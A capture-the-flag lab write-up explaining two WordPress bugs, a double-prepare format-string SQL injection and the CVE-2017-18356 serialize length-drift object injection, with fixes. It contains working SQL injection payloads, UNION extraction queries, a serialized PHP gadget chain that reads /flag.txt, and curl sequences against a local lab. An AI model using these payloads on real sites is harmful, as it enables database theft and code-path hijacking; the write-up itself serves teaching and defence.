# 06 — WordPress Placeholder Injection — Writeup

## TL;DR

Two flags, one story: a mistake, and the fix that became a new bug.

**Stage 2 — the mistake.** Until WordPress 4.8.3, `wpdb::prepare()` was a
quote-normaliser in front of `vsprintf()`. Pasting the output of one
`prepare()` into the *query* argument of another one — "double preparing" —
therefore let an attacker write the format string. `%1$%s` is rewritten by the
second `prepare()` into `%1$'%s'`; `sprintf` reads that `'` as a *padding-character
flag*, so the quote that was supposed to open the value is spent, and the one
that was supposed to close it is emitted after the value instead. Everything
after it is SQL.
Flag: `PHRACK{prepare_twice_and_inject_once}`

**Stage 1 — the fix.** 4.8.3 made `prepare()` end with
`add_placeholder_escape()`, which rewrites every `%` in the finished SQL into a
66-byte random token; the `query` filter puts them back with
`remove_placeholder_escape()` right before execution. MiniPress caches the
whole query object — including the prepared SQL in `WPL_Query::$request` — in a
transient, so `serialize()` runs **between** the two halves of that round trip.
The `s:<n>:` prefix counts 66 bytes per `%`, the stored row counts 1: **65
bytes of drift per percent sign**, nobody fixes the prefix. This is
CVE-2017-18356 (WooCommerce < 3.2.4), reproduced.
Flag: `PHRACK{one_percent_sign_is_worth_sixty_five_bytes}`

### The arc

```
2017-08-22  Slavco Mihajloski publishes "WordPress SQLi": prepare() is
            vsprintf(), so prepare(prepare(...)) is a format-string bug.
            Core's own delete_metadata() does it.                      <- STAGE 2

2017-09-19  WordPress 4.8.2 tries `preg_replace('/%(?:%|$|([^dsF]))/','%%\1')`.
            It escapes %1$s too, breaks a great many plugins, and is
            superseded two releases later.

2017-10-31  WordPress 4.8.3 ships the fix that is still in trunk: teach
            prepare() what a real placeholder looks like ($allowed_format),
            and hide every surviving '%' behind a random 66-byte token until
            the instant the query executes (placeholder_escape()).

2018-02-26  RIPS: WooCommerce cached a whole WP_Query -- containing that
            escaped SQL -- in a transient. serialize() measured the token,
            the query filter removed it, the length prefix kept counting it.
            CVE-2017-18356.                                            <- STAGE 1
```

Both bugs live in the same six lines of `wpdb::prepare()`. Stage 2 is what
those lines did before the patch; stage 1 is what the patch does.

> In real WordPress the two cannot coexist — the 4.8.3 escape is exactly what
> makes double preparing harmless. `wp-lite.php` therefore implements *both*
> historical versions of `prepare()` and selects one per database handle with
> `wpdb::$wp_version`. MiniPress core is `'4.8.3'`; the bundled
> `minipress-metatools` plugin ships a handle pinned to `'4.8.1'`. See the
> emulation notice in README.md.

---

## The bug

### Stage 2 — `prepare()` was never safe to nest

This is `wpdb::prepare()` as it shipped in WordPress 4.8.1,
[`wp-includes/wp-db.php:1291`](https://github.com/WordPress/WordPress/blob/4.8.1/wp-includes/wp-db.php#L1291):

```php
	public function prepare( $query, $args ) {
		if ( is_null( $query ) )
			return;

		// This is not meant to be foolproof -- but it will catch obviously incorrect usage.
		if ( strpos( $query, '%' ) === false ) {
			_doing_it_wrong( 'wpdb::prepare', sprintf( __( 'The query argument of %s must have a placeholder.' ), 'wpdb::prepare()' ), '3.9.0' );
		}

		$args = func_get_args();
		array_shift( $args );
		// If args were passed as an array (as in vsprintf), move them up
		if ( isset( $args[0] ) && is_array($args[0]) )
			$args = $args[0];
		$query = str_replace( "'%s'", '%s', $query ); // in case someone mistakenly already singlequoted it
		$query = str_replace( '"%s"', '%s', $query ); // doublequote unquoting
		$query = preg_replace( '|(?<!%)%f|' , '%F', $query ); // Force floats to be locale unaware
		$query = preg_replace( '|(?<!%)%s|', "'%s'", $query ); // quote the strings, avoiding escaped strings like %%s
		array_walk( $args, array( $this, 'escape_by_ref' ) );
		return @vsprintf( $query, $args );
	}
```

Read what it is, not what it is called. It is **not** a prepared statement: it
is `vsprintf()` with a helper that adds quotes around `%s`. The values are
escaped (`escape_by_ref` → `_real_escape` → `mysqli_real_escape_string`), which
is why you cannot simply send a `'`. But the *query* argument is a live sprintf
format string, and nothing in 4.8.1 protects it — a `%` that arrived in
`$query` is a `%` that `vsprintf()` will act on.

The API docs said "pass a literal query template". Nothing enforced it.
Slavco Mihajloski went looking for code that ignored the advice and found it in
core, in `delete_metadata()`
([`wp-includes/meta.php:366`](https://github.com/WordPress/WordPress/blob/4.8.1/wp-includes/meta.php#L366)):

```php
	if ( $delete_all ) {
		$value_clause = '';
		if ( '' !== $meta_value && null !== $meta_value && false !== $meta_value ) {
			$value_clause = $wpdb->prepare( " AND meta_value = %s", $meta_value );
		}

		$object_ids = $wpdb->get_col( $wpdb->prepare( "SELECT $type_column FROM $table WHERE meta_key = %s $value_clause", $meta_key ) );
	}
```

`$value_clause` is the *output* of `prepare()`. It is then interpolated into
the *query* argument of a second `prepare()`. The attacker's `$meta_value`
went in as data and comes back out as format string.

MiniPress ships that shape as a maintenance plugin,
`challenge/src/meta.php` — the same two calls, with the DELETE half removed so
the tool only previews what it would touch:

```php
function wpl_meta_delete_preview($meta_key, $meta_value)
{
    global $wpdb_meta;

    $value_clause = '';
    if ('' !== $meta_value && null !== $meta_value && false !== $meta_value) {
        $value_clause = $wpdb_meta->prepare(' AND meta_value = %s', $meta_value);
    }

    $sql = $wpdb_meta->prepare(
        "SELECT product_id FROM wpl_productmeta WHERE meta_key = %s$value_clause",
        $meta_key
    );
    ...
}
```

`$wpdb_meta` is a `WPL_Meta_DB`, i.e. `wpdb` with `$wp_version = '4.8.1'`.

### Stage 1 — the fix, turned into a new bug

4.8.3 rewrote the same function,
[`wp-includes/wp-db.php:1292`](https://github.com/WordPress/WordPress/blob/4.8.3/wp-includes/wp-db.php#L1292)
(diagnostics trimmed here; the full text is in the link):

```php
		/*
		 * Specify the formatting allowed in a placeholder. The following are allowed:
		 *
		 * - Sign specifier. eg, $+d
		 * - Numbered placeholders. eg, %1$s
		 * - Padding specifier, including custom padding characters. eg, %05s, %'#5s
		 * - Alignment specifier. eg, %05-s
		 * - Precision specifier. eg, %.2f
		 */
		$allowed_format = '(?:[1-9][0-9]*[$])?[-+0-9]*(?: |0|\'.)?[-+0-9]*(?:\.[0-9]+)?';

		$query = str_replace( "'%s'", '%s', $query ); // Strip any existing single quotes.
		$query = str_replace( '"%s"', '%s', $query ); // Strip any existing double quotes.
		$query = preg_replace( '/(?<!%)%s/', "'%s'", $query ); // Quote the strings, avoiding escaped strings like %%s.

		$query = preg_replace( "/(?<!%)(%($allowed_format)?f)/" , '%\\2F', $query ); // Force floats to be locale unaware.

		$query = preg_replace( "/%(?:%|$|(?!($allowed_format)?[sdF]))/", '%%\\1', $query ); // Escape any unescaped percents.

		array_walk( $args, array( $this, 'escape_by_ref' ) );
		$query = @vsprintf( $query, $args );

		return $this->add_placeholder_escape( $query );
```

Two defences, and either one alone would have stopped stage 2:

* **"Escape any unescaped percents"** turns anything that is not a real
  placeholder into `%%`. `%1$%s` is not a valid placeholder (`$allowed_format`
  can match `1$`, but the character after it must be `s`, `d` or `F`, and it is
  `%`), so it becomes `%%1$%s` and `vsprintf` prints a literal `%1$` followed
  by the quoted value.
* **`add_placeholder_escape()`** — plus the matching call at the end of
  `_real_escape()`,
  [`wp-db.php:1168`](https://github.com/WordPress/WordPress/blob/4.8.3/wp-includes/wp-db.php#L1168)
  — means a `%` that came from *data* never reaches a query string as a `%` at
  all. It reaches it as a random 66-byte token.

```php
	public function placeholder_escape() {
		static $placeholder;

		if ( ! $placeholder ) {
			// If ext/hash is not present, compat.php's hash_hmac() does not support sha256.
			$algo = function_exists( 'hash' ) ? 'sha256' : 'sha1';
			// Old WP installs may not have AUTH_SALT defined.
			$salt = defined( 'AUTH_SALT' ) ? AUTH_SALT : rand();

			$placeholder = '{' . hash_hmac( $algo, uniqid( $salt, true ), $salt ) . '}';
		}

		/*
		 * Add the filter to remove the placeholder escaper. Uses priority 0, so that anything
		 * else attached to this filter will recieve the query with the placeholder string removed.
		 */
		if ( ! has_filter( 'query', array( $this, 'remove_placeholder_escape' ) ) ) {
			add_filter( 'query', array( $this, 'remove_placeholder_escape' ), 0 );
		}

		return $placeholder;
	}

	public function add_placeholder_escape( $query ) {
		/*
		 * To prevent returning anything that even vaguely resembles a placeholder,
		 * we clobber every % we can find.
		 */
		return str_replace( '%', $this->placeholder_escape(), $query );
	}

	public function remove_placeholder_escape( $query ) {
		return str_replace( $this->placeholder_escape(), '%', $query );
	}
```

and the removal point, `wpdb::query()`:

```php
		$query = apply_filters( 'query', $query );
```

Sizes matter here: the token is `{` + 64 hex characters + `}` = **66 bytes**,
and it is a `static`, so it is constant for the whole request. `add` grows
1 → 66. `remove` shrinks 66 → 1.

As long as the string only ever travels *query → execution*, the round trip is
a perfect identity and nothing is wrong. The escape is not the bug.

#### Where it stops being an identity

```
prepare()                       add_placeholder_escape()      1 byte  -> 66 bytes
        \
         \---> the string is stored somewhere, and serialize() measures it
        /
wpdb::query()                   remove_placeholder_escape()  66 bytes -> 1 byte
```

If anything *measures the length* of the escaped string and that measurement
travels with it, the measurement is 65 bytes per `%` too large by the time the
string reaches the database.

`serialize()` is exactly such a measurement.

WooCommerce hit this with `WC_Shortcode_Products::get_products()`:

```php
$products = get_transient( $transient_name );
if ( false === $products || ! is_a( $products, 'WP_Query' ) ) {
    $products = new WP_Query( $this->query_args );
    set_transient( $transient_name, $products, DAY_IN_SECONDS * 30 );
}
```

`WP_Query::$request` holds the SQL that was executed — still escaped.
`set_transient()` serializes the object, `update_option()` hands the blob to
`$wpdb`, and the `query` filter collapses the tokens *inside the already
serialized blob*. `get_transient()` → `maybe_unserialize()` then reads
`$request` for its stale declared length. CVE-2017-18356.

#### The same shape in MiniPress

`challenge/src/search.php`:

```php
$q          = new WPL_Query();
$q->request = $wpdb->prepare(
    "SELECT id, sku, title, content FROM wpl_products WHERE sku IN ($in) ORDER BY id ASC",
    $skus
);

foreach ($wpdb->get_results($q->request) as $row) {
    $p               = new WPL_Post();
    $p->ID           = (int) $row['id'];
    $p->post_title   = $row['title'];
    $p->post_content = $row['content'];
    $q->posts[]      = $p;
}
$q->found = count($q->posts);

/* keep the whole query object around for a month (cf. WooCommerce) */
set_transient($transient, $q, 30 * DAY_IN_SECONDS);
```

and `challenge/src/wp-lite.php`:

```php
function update_option($name, $value)
{
    global $wpdb;
    $serialized = maybe_serialize($value);          // <- length frozen HERE
    /* ... */
    return $wpdb->query($wpdb->prepare(             // <- tokens collapsed HERE
        "UPDATE wpl_options SET option_value = %s WHERE option_name = %s",
        $serialized, $name
    ));
}
```

#### The gadgets

`theme.php` ships two helpers the storefront really uses (see the footer of
every page):

```php
class WPL_Template_Tag
{
    public $template = '';
    public $vars     = array();

    public function __toString()
    {
        $tpl = @file_get_contents($this->template);
        if ($tpl === false) {
            return '';
        }
        return strtr($tpl, $this->vars);
    }
}

class WPL_Footer_Notice
{
    public $show = false;
    public $text = '';

    public function __destruct()
    {
        if ($this->show) {
            echo "\n<!-- minipress notice: " . $this->text . " -->\n";
        }
    }
}
```

```
maybe_unserialize()
  -> WPL_Footer_Notice::__destruct()        (fires at request shutdown)
       -> echo "..." . $this->text          (string concatenation)
            -> WPL_Template_Tag::__toString()
                 -> file_get_contents('/flag.txt')
```

The flag is echoed into the page as an HTML comment. No file write, no shell.

---

## Building the exploit

### Stage 2 — double preparing

#### 1. Notice that there are two database handles

`search.php` and `tools.php` both print the SQL they ran. Send `%%` through
each and compare (HTML entities unescaped, tokens abbreviated):

```sh
$ curl -sG http://127.0.0.1:8006/search.php --data-urlencode 'sku=%%' | grep -o "sku IN ([^<]*"
sku IN ('{2f0c388b...069763100}{2f0c388b...069763100}') ORDER BY id ASC

$ curl -sG http://127.0.0.1:8006/tools.php --data-urlencode 'meta_key=_thumbnail_id' \
         --data-urlencode 'meta_value=%%' | grep -o "AND meta_value = [^<]*"
AND meta_value = '%'
```

The shop turns each `%` into a 66-byte token. The maintenance plugin lets a
live `%` through — and it goes further than that: a *single* `%` makes its
`prepare()` bail (the page says `wpdb::prepare() refused that input`), which is
a `vsprintf()` complaint, not a database one. The value is reaching a format
string. The plugin header says why: it was written against WordPress 4.8.1 and
ships its own `$wpdb`.

#### 2. The payload from the article

```
%1$%s OR 1=1--#
```

Step one, the plugin prepares the clause. `$meta_value` is an **argument**
here, so it is escaped (`'` → `''`) and interpolated — its percent signs are
data and are copied verbatim:

```
prepare(' AND meta_value = %s', '%1$%s OR 1=1--#')
  -> preg_replace('|(?<!%)%s|', "'%s'")   ->   " AND meta_value = '%s'"
  -> vsprintf(...)                        ->   " AND meta_value = '%1$%s OR 1=1--#'"
```

Step two, the plugin prepares the query *with the clause pasted into it*. Now
`$meta_value` is part of the **format string**:

```
"SELECT product_id FROM wpl_productmeta WHERE meta_key = %s AND meta_value = '%1$%s OR 1=1--#'"
```

`preg_replace('|(?<!%)%s|', "'%s'", ...)` fires **twice**: once on the
legitimate placeholder, and once on the `%s` inside our value — the lookbehind
only rejects a `%s` preceded by `%`, and ours is preceded by `$`:

```
"SELECT product_id FROM wpl_productmeta WHERE meta_key = '%s' AND meta_value = '%1$'%s' OR 1=1--#'"
                                                                               ^^^^^^^^
                                                                     prepare() inserted those quotes
```

#### 3. Byte-level: how the quote changes sides

`vsprintf()` is now handed one argument (`$meta_key`) and this tail:

```
 byte  char   what sprintf does with it
 ----  -----  --------------------------------------------------------------
    0  '      literal  -- opened the value back in prepare() #1
    1  %      start of a conversion specification
    2  1      \
    3  $       > argnum: use argument #1, i.e. $meta_key
    4  '      FLAG: "pad with the character that follows"      <-- eaten
    5  %      ...the padding character is '%'                  <-- eaten
    6  s      conversion: string.  Width is 0, so no padding is emitted.
    7  '      literal  -- inserted by prepare() #2 as the CLOSING quote
    8  <sp>   literal
    9  O R ... literal SQL
```

Two quotes went in and two quotes come out, but they are no longer around the
same thing. Byte 4 — the quote `prepare()` added to *open* the value — is
consumed as a flag operand, so byte 7 (the quote that was meant to *close* the
value) ends up closing the literal that `prepare()` #1 opened:

```sql
SELECT product_id FROM wpl_productmeta
 WHERE meta_key = '_thumbnail_id' AND meta_value = '_thumbnail_id' OR 1=1--#'
                                                   ^^^^^^^^^^^^^^^ ^^^^^^^^^^
                                                   argument #1,    outside the
                                                   printed twice   string now
```

`--` comments out the rest of the line (the orphan `'`) in SQLite; the article
writes `--#` because `#` is MySQL's own comment introducer. The query is valid
and the `WHERE` is ours. Observed:

```
benign  meta_value=42          ->  1 product
payload %1$%s OR 1=1--#        -> 11 products
```

#### 4. Why every byte of the payload is load bearing

| payload | result | why |
|---|---|---|
| `%1$%s OR 1=1--#` | **11 rows** | works |
| `%1$s OR 1=1--#` | 0 rows, no injection | `(?<!%)%s` matches only a bare `%s`, so `prepare()` inserts no quote and the whole payload stays inside the string literal |
| `%s OR 1=1--#` | `prepare()` returns `false` | two conversions, one argument: `ArgumentCountError` (on PHP 5/7, `@vsprintf` returned `false`) |
| `%2$%s OR 1=1--#` | `prepare()` returns `false` | there is no argument #2 |
| `' OR 1=1--#` | `''' OR 1=1--#` | `_real_escape()` doubles the quote — this is why the payload has to make `prepare()` supply the quote for it |

That last row is the whole trick in one line: **the attacker cannot write a
quote, so the payload makes `prepare()` write one on his behalf**, in a place
`prepare()` did not intend. And `%1$` is not decoration — argument swapping is
what lets the extra conversion reuse argument #1, so the argument count still
matches and `vsprintf()` does not bail.

#### 5. From `OR 1=1` to the flag

`get_col()` selects one column and the page prints it, so `OR 1=1` only ever
yields product ids. `UNION` changes what that column contains. No quotes are
available, so string literals are built with `char()`:

```sh
# what keys exist?
meta_value=%1$%s UNION SELECT meta_key FROM wpl_productmeta--#
  -> _minipress_license, _price, _stock, _thumbnail_id

# hand over every value, tagged with a per-run nonce so the answer is provably fresh
meta_value=%1$%s UNION SELECT meta_value FROM wpl_productmeta UNION SELECT char(110,52,51,...)--#
  -> 12.50, 19.00, 24.00, 3, 42, 43, 44, 45, 0, 12, n43c0f7e8..., PHRACK{prepare_twice_and_inject_once}
```

The final SQL:

```sql
SELECT product_id FROM wpl_productmeta
 WHERE meta_key = '_thumbnail_id'
   AND meta_value = '_thumbnail_id'
 UNION SELECT meta_value FROM wpl_productmeta
 UNION SELECT char(110,52,51,...)--#'
```

### Stage 1 — the transient

#### 1. See the token

```sh
curl -s 'http://127.0.0.1:8006/search.php?sku=TEE-01,%25%25' | tail -3
```

```html
<h4>$q-&gt;request</h4><pre>SELECT id, sku, title, content FROM wpl_products
WHERE sku IN (&#039;TEE-01&#039;, &#039;{2cde3f79ad138c42eca1a97395b3f502b86e
578fff746ec359e68769daa344b0}{2cde3f79ad138c42eca1a97395b3f502b86e578fff746ec3
59e68769daa344b0}&#039;) ORDER BY id ASC</pre>
```

Two `%` in, two 66-byte tokens out, and the token differs on every request
(it is derived from `uniqid()`).

#### 2. Confirm the corruption with no payload at all

Hit that URL once, then read the row straight out of SQLite:

```
$ docker compose exec challenge php -r '...SELECT option_value...'
O:9:"WPL_Query":3:{s:7:"request";s:224:"SELECT id, sku, title, content FROM
wpl_products WHERE sku IN ('TEE-01', '%%') ORDER BY id ASC";s:5:"found";i:1;...

unserialize() -> bool(false)
```

`s:224:` for a value that is 94 bytes long: **130 = 2 × 65** bytes missing.
The primitive is confirmed before a single gadget is written; it just is not
*aligned* yet, so `unserialize()` bails.

#### 3. Line the drift up with something we control

The cached object serializes as

```
O:9:"WPL_Query":3:{
  s:7:"request";s:<LR>:"<sql>";
  s:5:"found";i:<F>;
  s:5:"posts";a:<N>:{i:0;O:8:"WPL_Post":3:{
      s:2:"ID";i:<ID>;
      s:10:"post_title";s:<LT>:"<title>";
      s:12:"post_content";s:<LC>:"<content>";
  }}
}
```

`<content>` is the product description: fully attacker controlled, up to 1024
bytes. So the gap the stale `<LR>` has to swallow is

```
";s:5:"found";i:<F>;s:5:"posts";a:<N>:{i:0;O:8:"WPL_Post":3:{s:2:"ID";i:<ID>;s:10:"post_title";s:<LT>:"<title>";s:12:"post_content";s:<LC>:"
```

and it must equal `65 × k`, where `k` is the number of `%` we put in the
search. Knobs:

* `k` — coarse, 65 bytes per step.
* `<LT>` (title length) — fine, 1 byte per step, plus a jump when the digit
  count of `<LT>` changes.
* `<F>` and `<N>` are 1 because we search for exactly one real SKU.
* `<ID>` is not a knob, but IDs are `AUTOINCREMENT`: create a throwaway
  product, read the id back from the response, and the next one is `id + 1`.

With `ID = 5`, a 177-byte payload and an 8-byte title the gap is exactly
**130 = 2 × 65**.

#### 4. The payload

`WPL_Query` declares 3 properties, so after the giant `request` we owe the
parser two more name/value pairs and a `}`. The bytes left over in the
original blob after the description are `";}}}` — the string terminator, the
`WPL_Post` brace, the `posts` array brace and the `WPL_Query` brace — and they
have to be consumed exactly:

```
";                                          close the over-long request string
s:1:"a";O:17:"WPL_Footer_Notice":2:{...}    property #2 = the gadget
s:1:"b";a:1:{i:0;a:1:{i:0;s:5:"pwned        property #3 = two nested arrays,
                                            last string left OPEN
        ---- original blob resumes here ----
";                                          closes s:5:"pwned"
}}                                          closes both arrays
}                                           closes WPL_Query. 3/3 properties.
```

Objects and arrays are **not** `;`-terminated in PHP's format, which is why
`O:17:"WPL_Footer_Notice":2:{...}` can sit directly against the next property
name.

#### 5. Byte-level walkthrough

What `serialize()` produced (`<sql>` still holds two 66-byte tokens, so
`request` is declared 231 bytes):

```
O:9:"WPL_Query":3:{s:7:"request";s:231:"SELECT ... sku IN ('PD658021AC400', '{2cde...b0}{2cde...b0}') ORDER BY id ASC";s:5:"found";i:1;...
                                 ^^^^^^ 101 - 2 + 2*66 = 231
```

What `remove_placeholder_escape()` stored (the two tokens are now two `%`, the
value is 101 bytes, the prefix still says 231):

```
O:9:"WPL_Query":3:{s:7:"request";s:231:"SELECT id, sku, title, content FROM wpl_products WHERE sku IN ('PD658021AC400', '%%') ORDER BY id ASC";s:5:"found";i:1;s:5:"posts";a:1:{i:0;O:8:"WPL_Post":3:{s:2:"ID";i:5;s:10:"post_title";s:8:"AAAAAAAA";s:12:"post_content";s:177:"";s:1:"a";O:17:"WPL_Footer_Notice":2:{s:4:"show";b:1;s:4:"text";O:16:"WPL_Template_Tag":2:{s:8:"template";s:9:"/flag.txt";s:4:"vars";a:0:{}}}s:1:"b";a:1:{i:0;a:1:{i:0;s:5:"pwned";}}}
```

and how `maybe_unserialize()` reads it:

```
 offset  bytes                                what the parser does
 ------  -----------------------------------  ---------------------------------------
      0  O:9:"WPL_Query":3:{                  object header, 3 properties expected
     19  s:7:"request";                       property #1 name
     33  s:231:"                              string value, DECLARED LENGTH = 231
 .-  40  SELECT ... ('PD658021AC400','%%')... 101 real bytes ... 130 to go
 |       ...ORDER BY id ASC
 |  141  ";s:5:"found";i:1;                -.
 |  159  s:5:"posts";a:1:{i:0;              |
 |  180  O:8:"WPL_Post":3:{                 |  130 bytes of serialized FRAMING,
 |  198  s:2:"ID";i:5;                      |  consumed as if they were SQL
 |  211  s:10:"post_title";                 |  ( 130 == 2 * 65 == 2 * (66 - 1) )
 |  229  s:8:"AAAAAAAA";                    |
 |  244  s:12:"post_content";                |
 |  264  s:177:"                           -'
 `-> 271  ";                                 40 + 231 == 271 : the value ends here
                                             and the parser finds the '";' it wants.
                                             $request is now the SQL *plus* all the
                                             framing above.

    273  s:1:"a";                             property #2 name  (OURS)
    281  O:17:"WPL_Footer_Notice":2:{         property #2 value: the gadget
             s:4:"show";b:1;
             s:4:"text";O:16:"WPL_Template_Tag":2:{
                 s:8:"template";s:9:"/flag.txt";
                 s:4:"vars";a:0:{}
             }
         }
         s:1:"b";                             property #3 name  (OURS)
         a:1:{i:0;a:1:{i:0;s:5:"pwned         property #3 value, left OPEN
         ";                                   <- from the ORIGINAL blob: closes it
         }}                                   <- closes both arrays
         }                                    <- closes WPL_Query. Nothing left over.
```

`is_serialized()` waves it through (first byte `O`, second byte `:`, last byte
`}`, `/^O:[0-9]+:/` matches — it never looks at interior lengths), so
`maybe_unserialize()` calls `@unserialize()` and the object graph is built.
At shutdown `WPL_Footer_Notice::__destruct()` concatenates `$this->text`,
which invokes `WPL_Template_Tag::__toString()`, which reads `/flag.txt`:

```html
<!-- minipress notice: PHRACK{one_percent_sign_is_worth_sixty_five_bytes}
 -->
```

#### 6. Reproducing it by hand

```sh
make up

# 1. burn an id so we can predict the next one
curl -s http://127.0.0.1:8006/product.php -d 'sku=PROBE&title=p&content=p' | grep -o 'id=[0-9]*'
# -> id=4     so our product will be id=5

# 2. store the payload (title padded to 8 bytes)
curl -s http://127.0.0.1:8006/product.php \
  -d 'sku=MYSKU' -d 'title=AAAAAAAA' \
  --data-urlencode 'content=";s:1:"a";O:17:"WPL_Footer_Notice":2:{s:4:"show";b:1;s:4:"text";O:16:"WPL_Template_Tag":2:{s:8:"template";s:9:"/flag.txt";s:4:"vars";a:0:{}}}s:1:"b";a:1:{i:0;a:1:{i:0;s:5:"pwned' \
  | grep -o 'id=[0-9]*'

# 3. prime the cache -- this request is the one that corrupts the row
curl -s -o /dev/null 'http://127.0.0.1:8006/search.php?sku=MYSKU%2C%25%25'

# 4. read it back
curl -s 'http://127.0.0.1:8006/search.php?sku=MYSKU%2C%25%25' | tail -3
```

(`%2C` is the comma separating the two SKUs, `%25%25` is the `%%` that carries
the two placeholders.)

And by hand for stage 2:

```sh
curl -sG http://127.0.0.1:8006/tools.php \
  --data-urlencode 'meta_key=_thumbnail_id' \
  --data-urlencode 'meta_value=%1$%s UNION SELECT meta_value FROM wpl_productmeta--#'
```

---

## The exploit

`solve/solve.py` (Python 3 stdlib only) runs both stages and prints

```
SQLI FLAG: PHRACK{prepare_twice_and_inject_once}
FLAG: PHRACK{one_percent_sign_is_worth_sixty_five_bytes}
```

**Stage 1 — `stage1()`**

1. **Constants derived, not guessed** —
   `TOKEN_LEN = 66` (`{` + 64 hex + `}`) and `SHRINK = TOKEN_LEN - len('%') = 65`.
2. **Gadget** — `obj()`/`s()` emit PHP's format with computed length prefixes;
   `WPL_Footer_Notice{show:true, text: WPL_Template_Tag{template:'/flag.txt'}}`.
3. **`PAYLOAD`** — `'";' + s("a") + GADGET + 's:1:"b";a:1:{i:0;a:1:{i:0;s:5:"pwned'`,
   asserted to contain no `%` (it would add drift of its own) and no `'`
   (it would change the escaped byte count).
4. **`gap(post_id, title_len)`** — rebuilds the exact framing string so the gap
   is *measured*.
5. **`plan(post_id)`** — sweeps the title length until `len(gap) % 65 == 0`,
   returning `(k, title_len)`.
6. **Drive it** — probe product to learn the next auto-increment id, real
   product with the computed title and the payload as its description, then
   `GET /search.php?sku=<sku>,%%...` twice: the first call fills (and corrupts)
   the transient, the second reads it back.

**Stage 2 — `stage2()`**

1. **Per-run nonce** — `"n" + secrets.token_hex(8)`.
2. **Snapshot / negative control** — an honest `meta_value=42` query first, and
   the exploit aborts if that response already contains a flag or the nonce.
   Nothing in stage 2 writes to the database, and the assertion is on a
   response that had to contain this run's nonce, so a leftover from an earlier
   run against a warm container cannot satisfy it.
3. **Confirm the primitive** — the article's `%1$%s OR 1=1--#`, asserted to
   return *more* rows than the control. If the plugin were on 4.8.3 this
   returns fewer (the tokens make `meta_value` unmatchable) and the exploit
   stops there.
4. **Enumerate** — `UNION SELECT meta_key ...` to see what is in the table.
5. **Exfiltrate** — `UNION SELECT meta_value ... UNION SELECT char(<nonce>)`,
   asserting the nonce comes back *out of SQLite* in the same response as the
   flag.

Run twice against the same warm container, both runs exit 0 and both mint a
fresh nonce; patch `WPL_Meta_DB::$wp_version` to `'4.8.3'` in a running
container and stage 2 fails with `OR 1=1 did not widen the result set` even
though the licence row is still sitting in the database.

## Fixing it

### Stage 2

**Never call `prepare()` on anything but a literal query template.** That is
the whole rule, and note that WordPress still does not *enforce* it: there is
no runtime error for preparing an already prepared string, even in trunk. The
only thing standing between a plugin and stage 2 is the 4.8.3 escape.
Build the clause and the arguments separately:

```php
// wrong: the clause is a format string by the time prepare() sees it
$value_clause = $wpdb->prepare( ' AND meta_value = %s', $meta_value );
$sql = $wpdb->prepare( "SELECT product_id FROM t WHERE meta_key = %s $value_clause", $meta_key );

// right: one prepare(), one template, all values as arguments
$sql = $wpdb->prepare(
    'SELECT product_id FROM t WHERE meta_key = %s AND meta_value = %s',
    $meta_key,
    $meta_value
);
```

When the clause really is optional, keep the *template* conditional and the
values in the argument list:

```php
$where = 'meta_key = %s';
$args  = array( $meta_key );
if ( '' !== $meta_value ) {
    $where .= ' AND meta_value = %s';
    $args[] = $meta_value;
}
$sql = $wpdb->prepare( "SELECT product_id FROM t WHERE $where", $args );
```

And update: 4.8.3 fixes this class of bug even in code that keeps doing it
wrong. That is what a real fix looks like — it protects the callers who did
not read the docs.

Two smaller lessons from the same function:

* `if ( isset( $args[0] ) && is_array( $args[0] ) )` in 4.8.1 had no
  `count($args) == 1` guard, so a single attacker-controlled *first* argument
  could replace the entire argument list. 4.8.2 added the guard.
* `%d` is not a sanitiser. Slavco's original chain went through
  `prepare("... WHERE ID = %d", $post_id)`; `%1$%s` slips past it the same way,
  because the swap happens before any conversion is performed.

### Stage 1

The application-level fix is the one RIPS recommended in 2018 and the one
WooCommerce shipped in 3.2.4: **do not cache objects that contain prepared
SQL.** Cache identifiers and re-run the (cheap, indexed) query:

```php
// wrong: $q->request still contains placeholder tokens
set_transient($transient, $q, 30 * DAY_IN_SECONDS);

// right: cache the ids only
set_transient($transient, wp_list_pluck($q->posts, 'ID'), 30 * DAY_IN_SECONDS);
```

If an object really must be cached, strip the escaped SQL first — WordPress
even gives you the tool:

```php
$q->request = $wpdb->remove_placeholder_escape($q->request);
set_transient($transient, $q, 30 * DAY_IN_SECONDS);
```

Defence in depth, in order of usefulness:

* **Do not let `maybe_unserialize()` build arbitrary objects.** Store cache
  payloads as JSON, or gate the read:
  `unserialize($blob, ['allowed_classes' => [WPL_Query::class, WPL_Post::class]])`.
  That alone kills this chain: `WPL_Footer_Notice` would come back as
  `__PHP_Incomplete_Class`, which has no `__destruct()`.
* **Treat a serialized blob as immutable.** Anything that rewrites bytes
  between `serialize()` and `unserialize()` — a filter, an escape round trip, a
  charset conversion, a column truncation — is an object-injection primitive.
* Note what is *not* a fix: the token is unguessable, so "the attacker cannot
  know the placeholder" is irrelevant. The attacker never needs to know it,
  only to know how long it is.

## Going further

* **Column truncation** gets you the same primitive with no `%` at all: store a
  serialized blob in a column that is too short (or in a `utf8` column via a
  4-byte emoji — Tom Van Goethem's WordPress < 3.6.1 object injection did
  exactly this with U+1F4A9) and the value comes back shorter than its prefix
  claims.
* **Grow instead of shrink.** Everything here is a *shrink*; lab 05's "Going
  further" covers the mirror image (0CTF `piapiapia`, where the filter makes
  the value longer than declared and the payload has to sit at the tail of the
  same field).
* **Chain length.** The gap here is 130 bytes because the framing between
  `request` and `post_content` happens to be small. In real WooCommerce the
  gap crossed a full `WP_Post` with 24 properties, which is why the RIPS
  authors deliberately did not publish a working exploit.
* **The 4.8.2 detour.** Try implementing 4.8.2's one-liner,
  `preg_replace('/%(?:%|$|([^dsF]))/', '%%\\1', $query)`, in `wp-lite.php` and
  run stage 2 against it: the injection dies, and so does every legitimate
  `%1$s` in the codebase. That is the release that broke thousands of plugins
  in a weekend and had to be redone as 4.8.3.
* **Blind stage 2.** `tools.php` prints the SQL and the SQLite error, which
  makes the injection comfortable. Delete both `echo`s and redo it: the row
  count is still an oracle, and `CASE WHEN ... THEN` plus a `char()` literal
  gets you a boolean channel with no quotes at all.
* **Find the next one.** For stage 1, grep any WordPress plugin for
  `set_transient`/`update_option`/`update_post_meta` receiving a value that was
  produced, directly or indirectly, by `$wpdb->prepare()` or `esc_sql()` —
  `_real_escape()` also ends in `add_placeholder_escape()`. For stage 2, grep
  for `$wpdb->prepare(` whose first argument is not a single-quoted literal.

## References

* Orange Tsai, *"The Art of PHP - My CTF Journey and Untold Stories!"*,
  Phrack #72, chapter 2.1 — the source of this lab.
* Slavco Mihajloski, *"WordPress SQLi"*, 2017-08-22 — double preparing,
  `delete_metadata()`, the `%1$%s` payload (stage 2) —
